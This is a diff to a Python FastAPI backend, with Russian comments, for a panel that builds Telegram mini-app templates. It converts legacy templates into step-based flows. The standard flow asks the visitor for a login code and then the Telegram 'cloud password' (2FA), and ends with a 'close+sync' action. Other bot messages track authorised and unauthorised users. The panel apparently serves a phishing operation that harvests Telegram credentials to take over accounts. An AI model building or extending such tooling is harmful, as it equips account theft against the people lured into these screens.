@@ -628,33 +628,185 @@ async def bt_list(user: dict = Depends(verify_panel_user)) -> list[dict]:
     return out
 
 
+def _split_title(text: str) -> tuple[str, str]:
+    """Делит текст на (title, description): title = первая строка ≤80 символов,
+    description = остаток. Если в одну строку — title = весь текст, desc = ''."""
+    if not text:
+        return "", ""
+    text = str(text).strip()
+    if "\n" in text:
+        first, rest = text.split("\n", 1)
+        first = first.strip()
+        rest = rest.strip()
+        if first and len(first) <= 80:
+            return first, rest
+    if len(text) <= 80:
+        return text, ""
+    # Длинная строка без переносов — берём как описание
+    return "", text
+
+
+def _legacy_to_builder(content: dict, kind: str, slug: str) -> dict:
+    """Конвертирует content старого шаблона в формат конструктора.
+
+    Поля старого формата:
+      Бот-разделы (top-level): start_msg, start_btn, second_msg, expired_msg,
+        expired_btn, auth_ok, spam_auth, spam_unauth, admin_post, show_auth,
+        show_code
+      Страницы (page_field): main_emoji/main_button/main_text/main_waiting,
+        code_emoji/code_button/code_text/code_wrong,
+        twofa_emoji/twofa_button/twofa_text/twofa_hint/twofa_placeholder,
+        success_emoji/success_button/success_text
+    """
+    content = content or {}
+
+    def pick(*keys: str, default: str = "") -> str:
+        for k in keys:
+            v = content.get(k)
+            if v and str(v).strip():
+                return str(v)
+        return default
+
+    # Тексты сообщений бота (вне мини-аппа) — сохраняем в bot_messages.
+    bot_messages = {
+        "start_msg":   pick("start_msg"),
+        "start_btn":   pick("start_btn"),
+        "second_msg":  pick("second_msg"),
+        "expired_msg": pick("expired_msg"),
+        "expired_btn": pick("expired_btn"),
+        "auth_ok":     pick("auth_ok"),
+        "spam_auth":   pick("spam_auth"),
+        "spam_unauth": pick("spam_unauth"),
+        "admin_post":  pick("admin_post"),
+        "show_auth":   pick("show_auth"),
+        "show_code":   pick("show_code"),
+    }
+    bot_messages = {k: v for k, v in bot_messages.items() if v}
+
+    base_theme = {"background": "#0e161e", "text": "#ffffff"}
+
+    if kind == "welcome":
+        wt, wd = _split_title(pick("start_msg", "main_text"))
+        steps = [{
+            "key": "welcome", "label": "Welcome",
+            "title": wt or "Добро пожаловать!",
+            "description": wd or pick("main_waiting"),
+            "icon": pick("main_emoji"),
+            "image": {"type": "sticker", "ref": "duck-wave", "anim": "float"},
+            "button": {"text": pick("start_btn", "main_button", default="Открыть"),
+                       "action": "close", "color": "#2ea6ff", "style": "filled"},
+            "theme": dict(base_theme),
+        }]
+    elif kind == "text":
+        tt, td = _split_title(pick("main_text", "start_msg"))
+        steps = [{
+            "key": "info", "label": "Info",
+            "title": tt or "Информация",
+            "description": td,
+            "icon": pick("main_emoji"),
+            "image": {"type": "sticker", "ref": "duck-fire", "anim": "fade"},
+            "button": {"text": pick("main_button", "start_btn", default="Понятно"),
+                       "action": "close", "color": "#2ea6ff", "style": "filled"},
+            "theme": dict(base_theme),
+        }]
+    else:  # standard
+        main_t, main_d = _split_title(pick("main_text", "start_msg"))
+        code_t, code_d = _split_title(pick("code_text"))
+        twofa_t, twofa_d = _split_title(pick("twofa_text"))
+        success_t, success_d = _split_title(pick("success_text", "auth_ok"))
+
+        # Если описания 2FA пусто, добавим подсказку
+        twofa_hint = pick("twofa_hint")
+        if twofa_hint and twofa_d:
+            twofa_d = f"{twofa_d}\n\n{twofa_hint}"
+        elif twofa_hint:
+            twofa_d = twofa_hint
+
+        steps = [
+            {
+                "key": "welcome", "label": "Welcome",
+                "title": main_t or "Добро пожаловать!",
+                "description": main_d,
+                "icon": pick("main_emoji"),
+                "image": {"type": "sticker", "ref": "duck-wave", "anim": "float"},
+                "button": {"text": pick("main_button", "start_btn", default="Начать"),
+                           "action": "goto:code", "color": "#2ea6ff", "style": "filled"},
+                "theme": dict(base_theme),
+            },
+            {
+                "key": "code", "label": "Код",
+                "title": code_t or "Введите код",
+                "description": code_d,
+                "icon": pick("code_emoji"),
+                "image": {"type": "sticker", "ref": "duck-key", "anim": "pop"},
+                "button": {"text": pick("code_button", default="Подтвердить"),
+                           "action": "verify:code", "color": "#2ea6ff", "style": "filled"},
+                "theme": dict(base_theme),
+            },
+            {
+                "key": "twofa", "label": "2FA",
+                "title": twofa_t or "Облачный пароль",
+                "description": twofa_d,
+                "icon": pick("twofa_emoji"),
+                "image": {"type": "sticker", "ref": "duck-shield", "anim": "fade"},
+                "button": {"text": pick("twofa_button", default="Подтвердить"),
+                           "action": "verify:2fa", "color": "#2ea6ff", "style": "filled"},
+                "theme": dict(base_theme),
+                "placeholder": pick("twofa_placeholder"),
+            },
+            {
+                "key": "success", "label": "Успех",
+                "title": success_t or "Готово!",
+                "description": success_d,
+                "icon": pick("success_emoji"),
+                "image": {"type": "sticker", "ref": "duck-party", "anim": "pop"},
+                "button": {"text": pick("success_button", default="Закрыть"),
+                           "action": "close+sync", "color": "#4dcd5e", "style": "filled"},
+                "theme": dict(base_theme),
+            },
+        ]
+
+    # Дополнительные кастомные тексты, не входящие в основной набор
+    extras = {}
+    if pick("code_wrong"):
+        extras["code_wrong"] = pick("code_wrong")
+    if pick("main_waiting"):
+        extras["main_waiting"] = pick("main_waiting")
+
+    data = {
+        "id": slug,
+        "name": slug,
+        "version": 1,
+        "kind": kind,
+        "steps": steps,
+    }
+    if bot_messages:
+        data["bot_messages"] = bot_messages
+    if extras:
+        data["extras"] = extras
+    return data
+
+
 @router.post("/builder/templates/import-legacy/{legacy_id}")
 async def bt_import_legacy(legacy_id: int,
                             user: dict = Depends(verify_panel_user)) -> dict:
-    """Импортирует старый шаблон в формат конструктора. Возвращает новый
-    builder-шаблон с теми же текстами в правильной структуре шагов."""
-    from database import (
-        builder_template_create, builder_template_default_data,
-        builder_template_get, _now,
-    )
+    """Импортирует старый шаблон в формат конструктора. Переносит ВСЕ
+    тексты: заголовки/описания/кнопки/эмодзи каждой страницы + сообщения
+    бота (start_msg, expired_msg, auth_ok и пр.) в bot_messages."""
+    from database import builder_template_create, _now
     t = get_template(legacy_id)
     if not t or t["owner_id"] != user["id"]:
         raise HTTPException(404, "legacy template not found")
 
     kind = t.get("kind") or "standard"
+    if kind not in ("standard", "welcome", "text"):
+        kind = "standard"
     slug = f"imported_{legacy_id}_{_now()}"
     name = (t.get("name") or "Импортированный")[:40]
 
-    data = builder_template_default_data(slug, kind=kind)
-    # Если есть кастомные тексты в content — переносим
     content = t.get("content") or {}
-    if isinstance(content, dict) and content:
-        # Минимальный маппинг: подменяем title первого шага из welcome_text
-        for s in data["steps"]:
-            if s["key"] == "welcome" and content.get("welcome_text"):
-                s["title"] = content["welcome_text"][:80]
-            if s["key"] == "code" and content.get("code_prompt"):
-                s["description"] = content["code_prompt"][:200]
+    data = _legacy_to_builder(content, kind, slug)
+    data["name"] = name
 
     return builder_template_create(user["id"], slug, name, data=data, kind=kind)
 
